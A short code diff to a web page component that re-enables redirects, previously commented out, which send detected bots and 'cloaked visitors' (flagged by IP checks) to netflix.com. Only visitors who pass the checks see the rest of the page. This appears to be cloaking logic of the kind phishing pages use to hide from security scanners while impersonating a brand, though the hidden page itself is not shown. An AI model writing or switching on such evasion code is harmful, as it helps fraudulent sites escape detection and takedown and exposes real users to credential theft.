@@ -21,8 +21,7 @@ export default function Home() {
     autoVerify: false,
     onBotDetected: () => {
       trackEvent('Bot Detected - Redirecting');
-      // Disabled for now - redirects removed
-      // window.location.href = 'https://www.netflix.com';
+      window.location.href = 'https://www.netflix.com';
     },
   });
 
@@ -61,18 +60,16 @@ export default function Home() {
         
         if (!ipData.isSafe) {
           trackEvent('Cloaked Visitor Detected', { checks: ipData.checks });
-          // Disabled - redirects removed
-          // window.location.href = 'https://www.netflix.com';
-          // return;
+          window.location.href = 'https://www.netflix.com';
+          return;
         }
 
         const isHuman = await verify();
         
         if (!isHuman) {
           trackEvent('Bot Detected via Anti-Bot', { threatScore });
-          // Disabled - redirects removed
-          // window.location.href = 'https://www.netflix.com';
-          // return;
+          window.location.href = 'https://www.netflix.com';
+          return;
         }
 
         setSecurityCheckComplete(true);
